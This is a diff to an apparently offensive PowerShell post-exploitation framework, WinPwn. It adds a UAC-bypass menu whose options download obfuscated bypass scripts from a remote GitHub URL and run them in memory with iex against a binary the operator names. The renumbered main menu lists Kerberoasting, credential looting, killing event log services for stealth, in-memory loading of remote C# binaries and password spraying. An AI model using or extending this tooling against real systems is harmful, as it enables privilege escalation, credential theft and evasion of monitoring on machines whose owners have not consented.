@@ -1064,6 +1064,45 @@ __        ___       ____
  While ($masterquestion -ne 9)
 }
 
+function UACBypass
+{
+    pathcheck
+    $currentPath = (Get-Item -Path ".\" -Verbose).FullName
+    @'
+
+             
+__        ___       ____                 
+\ \      / (_)_ __ |  _ \__      ___ __  
+ \ \ /\ / /| | '_ \| |_) \ \ /\ / | '_ \ 
+  \ V  V / | | | | |  __/ \ V  V /| | | |
+   \_/\_/  |_|_| |_|_|     \_/\_/ |_| |_|
+
+   --> UAC Bypass
+
+'@
+    
+    do
+    {
+        Write-Host "================ WinPwn ================"
+        Write-Host -ForegroundColor Green '1. UAC Magic, specify Binary!'
+        Write-Host -ForegroundColor Green '2. UAC Bypass ccmstp technique, specify Binary! '
+        Write-Host -ForegroundColor Green '3. DiskCleanup UAC Bypass, specify Binary! '
+        Write-Host -ForegroundColor Green '4. DccwBypassUAC technique, only cmd shell pop up!'
+        Write-Host -ForegroundColor Green '5. Exit. '
+        Write-Host "================ WinPwn ================"
+        $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
+        Switch ($masterquestion) 
+        {
+             1{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/uacmagic.ps1'); uacmagic -BinPath $command}
+             2{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/uaccmstp.ps1');uaccmstp -BinFile $command}
+             3{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/diskcleanupuac.ps1');DiskCleanupBypass -command $command}
+             5{$command = Read-Host -Prompt 'Enter the Command or executable PATH to execute:';iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/dccuac.ps1')}
+       }
+    }
+ While ($masterquestion -ne 5)
+
+}
+
 function passhunt
 {
 <#
@@ -2260,15 +2299,16 @@ __        ___       ____
         Write-Host -ForegroundColor Green '3. Domain recon menu! '
         Write-Host -ForegroundColor Green '4. Local privilege escalation checks! '
         Write-Host -ForegroundColor Green '5. Get SYSTEM using Windows Kernel Exploits! '
-        Write-Host -ForegroundColor Green '6. Kerberoasting! '
-        Write-Host -ForegroundColor Green '7. Loot local Credentials! '
-        Write-Host -ForegroundColor Green '8. Create an ADIDNS Wildcard! '
-        Write-Host -ForegroundColor Green '9. Sessiongopher! '
-        Write-Host -ForegroundColor Green '10. Kill the event log services for stealth! '
-	    Write-Host -ForegroundColor Green '11. Execute some C# Magic for Creds, Recon and Privesc!'
-	    Write-Host -ForegroundColor Green '12. Load custom C# Binaries from a webserver to Memory and execute them!'
-	    Write-Host -ForegroundColor Green '13. DomainPasswordSpray Attacks!'
-        Write-Host -ForegroundColor Green '14. Exit. '
+	Write-Host -ForegroundColor Green '6. Bypass UAC! '
+        Write-Host -ForegroundColor Green '7. Kerberoasting! '
+        Write-Host -ForegroundColor Green '8. Loot local Credentials! '
+        Write-Host -ForegroundColor Green '9. Create an ADIDNS Wildcard! '
+        Write-Host -ForegroundColor Green '10. Sessiongopher! '
+        Write-Host -ForegroundColor Green '11. Kill the event log services for stealth! '
+	Write-Host -ForegroundColor Green '12. Execute some C# Magic for Creds, Recon and Privesc!'
+	Write-Host -ForegroundColor Green '13. Load custom C# Binaries from a webserver to Memory and execute them!'
+	Write-Host -ForegroundColor Green '14. DomainPasswordSpray Attacks!'
+        Write-Host -ForegroundColor Green '15. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -2279,17 +2319,18 @@ __        ___       ____
              3{domainreconmodules}
              4{privescmodules}
              5{kernelexploits}
-             6{kerberoasting}
-             7{kittielocal}
-             8{adidnswildcard}
-             9{sessionGopher}
-            10{inv-phantom}
-            11{sharpcradle -allthosedotnet $true}
-	    12{sharpcradle}
-            13{domainpassspray}
-        }
+	     6{UACBypass}
+             7{kerberoasting}
+             8{kittielocal}
+             9{adidnswildcard}
+             10{sessionGopher}
+            11{inv-phantom}
+            12{sharpcradle -allthosedotnet $true}
+	    13{sharpcradle}
+            14{domainpassspray}
+        
     }
- While ($masterquestion -ne 14)
+ While ($masterquestion -ne 15)
      
     
     #End
